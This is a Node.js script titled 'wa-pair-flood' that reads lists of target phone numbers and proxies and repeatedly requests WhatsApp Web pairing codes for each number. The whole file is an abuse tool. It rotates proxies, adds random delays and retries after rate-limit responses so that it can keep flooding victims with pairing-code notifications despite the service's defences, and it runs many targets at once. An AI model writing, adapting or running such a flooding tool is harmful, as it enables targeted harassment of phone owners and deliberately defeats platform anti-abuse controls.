// wa-pair-flood.mjs — Node 20+, ESM
// Reads targets.txt + proxies.txt, drives the WhatsApp Web pairing-code
// endpoint per number with proxy rotation and rate-limit backoff.

import { readFileSync } from 'node:fs';
import { request, ProxyAgent } from 'undici';
import PQueue from 'p-queue';

const WZ = 'https://web.whatsapp.com';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36';

// --- load files -----------------------------------------------------------
function loadLines(path) {
  try {
    return readFileSync(path, 'utf8')
      .split('\n')
      .map(l => l.trim())
      .filter(l => l && !l.startsWith('#'));
  } catch (e) {
    console.error(`[fatal] can't read ${path}: ${e.message}`);
    process.exit(1);
  }
}

const CONFIG = JSON.parse(readFileSync('./config.json', 'utf8'));
const TARGETS = loadLines('./targets.txt');
const PROXIES = loadLines('./proxies.txt');

if (!TARGETS.length) { console.error('[fatal] targets.txt kosong'); process.exit(1); }
if (!PROXIES.length) console.warn('[warn] proxies.txt kosong — jalanin tanpa proxy (IP lo kena rate-limit cepat)');

// --- proxy pool (round-robin) --------------------------------------------
let proxyIdx = 0;
const dispatchers = new Map(); // cache ProxyAgent per URL

function nextProxy() {
  if (!PROXIES.length) return null;
  const p = PROXIES[proxyIdx % PROXIES.length];
  proxyIdx++;
  return p;
}

function getDispatcher(proxyUrl) {
  if (!proxyUrl) return undefined;
  if (!dispatchers.has(proxyUrl)) {
    dispatchers.set(proxyUrl, new ProxyAgent(proxyUrl));
  }
  return dispatchers.get(proxyUrl);
}

// --- helpers --------------------------------------------------------------
const sleep = ms => new Promise(r => setTimeout(r, ms));
const jitter = base => base + Math.floor((Math.random() * 2 - 1) * (CONFIG.jitterMs ?? 3000));
const log = (...a) => console.log(`[${new Date().toISOString()}]`, ...a);

// --- pairing client (per target) -----------------------------------------
class WaPairClient {
  constructor(proxyUrl) {
    this.jar = new Map();
    this.clientId = null;
    this.proxyUrl = proxyUrl;
    this.dispatcher = getDispatcher(proxyUrl);
  }

  _headers(extra = {}) {
    return {
      'user-agent': UA,
      origin: WZ,
      referer: `${WZ}/`,
      accept: '*/*',
      'accept-language': 'en-US,en;q=0.9',
      ...extra,
    };
  }

  async _fetch(path, { method = 'GET', body, headers = {} } = {}) {
    const cookie = [...this.jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
    const res = await request(`${WZ}${path}`, {
      method,
      headers: this._headers({ ...headers, ...(cookie ? { cookie } : {}) }),
      body,
      dispatcher: this.dispatcher,
    });
    const text = await res.body.text();
    const sc = res.headers['set-cookie'];
    if (sc) {
      for (const c of (Array.isArray(sc) ? sc : [sc])) {
        const [kv] = c.split(';');
        const i = kv.indexOf('=');
        if (i > 0) this.jar.set(kv.slice(0, i).trim(), kv.slice(i + 1));
      }
    }
    let json = null;
    try { json = JSON.parse(text); } catch {}
    return { status: res.statusCode, headers: res.headers, json, text };
  }

  async login() {
    const res = await this._fetch('/v1/users/login', {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: '',
    });
    if (res.status !== 200 || !res.json?.client_id) {
      throw new Error(`login ${res.status}: ${res.text.slice(0, 160)}`);
    }
    this.clientId = res.json.client_id;
    return this.clientId;
  }

  async requestPairingCode(phone) {
    if (!this.clientId) await this.login();
    const res = await this._fetch(`/v1/users/login/${this.clientId}/pairing-code`, {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: `phone=${encodeURIComponent(phone)}`,
    });
    if (res.status === 429) {
      const retry = Number(res.headers['retry-after'] ?? 60);
      const e = new Error('rate_limited'); e.retryAfter = retry * 1000; throw e;
    }
    if (res.status !== 200) {
      throw new Error(`code ${res.status}: ${res.text.slice(0, 160)}`);
    }
    return { code: res.json?.code ?? null, ttl: res.json?.ttl ?? 160_000 };
  }

  async ensureSession() {
    if (!this.clientId) return this.login();
    const res = await this._fetch(`/v1/users/login/${this.clientId}`);
    if (res.status !== 200) { this.jar.clear(); this.clientId = null; await this.login(); }
  }
}

// --- per-target runner ----------------------------------------------------
async function runTarget(phone, proxyUrl) {
  const client = new WaPairClient(proxyUrl);
  log(`▶ ${phone} | proxy=${proxyUrl ?? 'DIRECT'}`);
  try { await client.login(); }
  catch (e) { log(`✗ ${phone} login: ${e.message}`); return; }

  for (let i = 1; i <= CONFIG.maxAttemptsPerTarget; i++) {
    // optional per-attempt proxy rotation — rebuild client
    if (CONFIG.rotateProxyPerAttempt && PROXIES.length > 1) {
      const p = nextProxy();
      const fresh = new WaPairClient(p);
      try { await fresh.login(); Object.assign(client, fresh); }
      catch (e) { log(`✗ ${phone} rot-proxy login: ${e.message}`); }
    }
    try {
      await client.ensureSession();
      const { code, ttl } = await client.requestPairingCode(phone);
      log(`  ✓ ${phone} [${i}/${CONFIG.maxAttemptsPerTarget}] code=${code} ttl=${Math.round(ttl/1000)}s`);
    } catch (e) {
      if (e.message === 'rate_limited') {
        log(`  ⏸ ${phone} 429 — sleep ${Math.round(e.retryAfter/1000)}s`);
        await sleep(e.retryAfter);
        i--; continue;
      }
      log(`  ✗ ${phone} [${i}] ${e.message} — reauth`);
      try { await client.login(); } catch {}
    }
    await sleep(jitter(CONFIG.intervalMs));
  }
  log(`■ ${phone} done`);
}

// --- main -----------------------------------------------------------------
async function main() {
  log(`targets=${TARGETS.length} proxies=${PROXIES.length} interval≈${CONFIG.intervalMs}ms`);
  const queue = new PQueue({ concurrency: CONFIG.concurrency });

  let i = 0;
  for (const phone of TARGETS) {
    const proxy = CONFIG.rotateProxyPerTarget ? PROXIES[i % PROXIES.length] : (PROXIES[0] ?? null);
    i++;
    queue.add(() => runTarget(phone, proxy));
  }
  await queue.onIdle();
  log('queue drained. done.');
}

process.on('SIGINT', () => { log('SIGINT — drain'); process.exit(0); });
main().catch(e => { console.error(e); process.exit(1); });